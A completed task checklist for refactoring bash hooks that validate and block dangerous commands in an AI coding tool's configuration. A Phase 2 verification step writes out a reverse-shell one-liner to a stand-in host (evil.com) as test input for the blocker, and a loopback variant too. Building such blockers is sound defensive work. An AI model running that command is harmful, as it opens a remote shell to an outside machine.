# Tasks: bash-hook-registration-pattern

## Phase 1: bash-command-validator.sh

- [x] Add `rule()` registration function above the patterns/messages declarations
- [x] Replace `patterns=( ... )` and `messages=( ... )` arrays with individual `rule 'pattern' 'message'` calls
- [x] Verify evaluation loop still iterates over `patterns`/`messages` arrays correctly
- [x] Run existing tests: `pytest configs/home-manager/claude/tests/` — confirm no regressions

## Phase 2: block-dangerous-bash.sh

- [x] Add `rule()` registration function (triplet: exemption, pattern, message) and empty `rules=()` array
- [x] Extract per-category block messages into named `_MSG_*` variables
- [x] Replace all per-category arrays and loops with `rule` declarations grouped by category comment
- [x] Write single evaluation loop replacing the eight per-category loops, preserving exemption logic
- [x] Manually verify: `echo '{"tool_name":"Bash","tool_input":{"command":"bash -i >& /dev/tcp/evil.com/4242 0>&1"}}' | bash configs/home-manager/claude/hooks/block-dangerous-bash.sh` exits 2
- [x] Manually verify: loopback exemption still exits 0 for `bash -i >& /dev/tcp/localhost/4242 0>&1`

## Phase 3: session-tool-checks.sh

- [x] Add `require_tool name hint` and `recommend_tool name hint` registration functions and empty arrays
- [x] Replace each `if ! command -v` block with a `require_tool` or `recommend_tool` call
- [x] Write required-tools evaluation loop (exits 2 with message on missing)
- [x] Write recommended-tools evaluation loop (warns to stderr, exits 0 on missing)
- [x] Run existing tests: `pytest configs/home-manager/claude/tests/test_session_tool_checks.py` — confirm no regressions

## Phase 4: Validation

- [x] Confirm `bash -n` (syntax check) passes for all three refactored hooks
- [x] Confirm the full test suite passes: `pytest configs/home-manager/claude/tests/`
